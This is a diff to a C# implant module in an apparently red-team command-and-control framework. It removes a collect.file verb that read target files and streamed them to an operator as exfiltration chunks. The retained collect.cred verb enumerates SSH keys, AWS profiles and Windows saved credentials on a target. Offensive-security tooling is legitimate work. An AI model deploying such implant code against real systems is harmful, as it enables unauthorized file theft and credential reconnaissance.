@@ -1,25 +1,22 @@
 using System.Diagnostics;
 using System.Runtime.Versioning;
 using System.Security.Cryptography;
-using System.Text;
 using Rod.V1;
 using SysFile = System.IO.File;
 
 namespace Rod.Implant.Internal;
 
 // Holds the collect.* verbs the reference implant advertises (architecture.md
-// Sec 10.1, ADR 0004). collect.file reads a file off the target's filesystem
-// and returns it inline; files larger than the task-output limit are returned
-// as ExfilChunk frames so the operator retrieves the whole thing through the
-// artifact store. collect.cred enumerates standard credential stores on the
-// target -- SSH key fingerprints, the names of AWS profiles, the Windows
+// Sec 10.1, ADR 0004). collect.cred enumerates standard credential stores on
+// the target -- SSH key fingerprints, the names of AWS profiles, the Windows
 // saved-credential listing -- and reports what it found without dumping secret
-// material. LSASS memory dumping stays out-of-tree (ADR 0004); collect.keylog
-// is contract-only and not implemented here.
+// material. File reads moved to the core file verbs (file.pull / file.push in
+// Files.cs): upload and download are operator file transfer, not collection.
+// LSASS memory dumping stays out-of-tree (ADR 0004); collect.keylog is
+// contract-only and not implemented here.
 //
 // Argument shape:
 //
-//   collect.file <path>
 //   collect.cred  [<source>]   source in {ssh, aws, cmdkey} (optional)
 //
 // As with the other reference handlers, this performs no evasion, no
@@ -29,65 +26,6 @@ namespace Rod.Implant.Internal;
 
 internal static class Collect
 {
-    // The largest file payload returned inline in a TaskResult. Files at or
-    // below this size are returned whole in the output string; larger files are
-    // returned as ExfilChunk frames so the operator can retrieve the complete
-    // contents through the artifact store. 1 MiB matches the teamserver's
-    // per-frame budget (architecture.md Sec 11).
-    private const int MaxInlineBytes = 1 << 20; // 1 MiB
-
-    // The size of each ExfilChunk data payload for files streamed out of band.
-    // Kept well under the gRPC default receive ceiling so a marshaled Frame
-    // still fits with room to spare.
-    private const int ChunkSize = 512 * 1024; // 512 KiB
-
-    /// <summary>
-    /// Reads the file at the given path. Small files return Succeeded with the
-    /// contents in the output string; large files return Succeeded with a short
-    /// manifest line in the output and the contents spread across ExfilChunk
-    /// frames the beacon streams to the artifact store.
-    /// </summary>
-    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) File(string arguments)
-    {
-        var path = arguments.Trim();
-        if (path.Length == 0)
-            return (TaskOutcome.Failed, "collect.file expects '<path>'", Array.Empty<ExfilChunk>());
-
-        if (!SysFile.Exists(path))
-        {
-            // Exists is false for both missing files and directories; distinguish
-            // so the operator sees the cause rather than guessing.
-            if (Directory.Exists(path))
-                return (TaskOutcome.Failed,
-                    "collect.file refuses to dump a directory: " + path, Array.Empty<ExfilChunk>());
-            return (TaskOutcome.Failed, "stat " + path + ": file not found", Array.Empty<ExfilChunk>());
-        }
-
-        byte[] data;
-        try
-        {
-            data = SysFile.ReadAllBytes(path);
-        }
-        catch (Exception ex)
-        {
-            return (TaskOutcome.Failed, "read " + path + ": " + ex.Message, Array.Empty<ExfilChunk>());
-        }
-
-        // Small enough to return inline: report the bytes verbatim.
-        if (data.Length <= MaxInlineBytes)
-        {
-            return (TaskOutcome.Succeeded, Encoding.UTF8.GetString(data), Array.Empty<ExfilChunk>());
-        }
-
-        // Too large for a TaskResult: stream as ExfilChunk frames. The output
-        // carries a short manifest; the chunks carry the bytes.
-        var name = Path.GetFileName(path);
-        var chunks = ChunkFile(name, "application/octet-stream", data);
-        return (TaskOutcome.Succeeded,
-            $"{path}: {data.Length} bytes, {chunks.Count} chunks streamed to artifact store",
-            chunks);
-    }
-
     /// <summary>
     /// Enumerates standard credential stores on the target and reports what it
     /// found, without dumping secret material. On Linux it lists SSH keys
@@ -121,12 +59,6 @@ internal static class Collect
             ? (TaskOutcome.Succeeded, "(no credentials found)", Array.Empty<ExfilChunk>())
             : (TaskOutcome.Succeeded, string.Join("\n", lines), Array.Empty<ExfilChunk>());
     }
-
-    // Slices a byte buffer into ExfilChunk frames of ChunkSize via the shared
-    // chunker (0-origin sequences, terminal on the last chunk); the server
-    // reassembles strictly by sequence and flushes on the terminal frame.
-    internal static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
-        => Chunking.ChunkFile(name, contentType, data, ChunkSize);
 
     private static bool IsKnownCredSource(string s)
         => s is "ssh" or "aws" or "cmdkey";
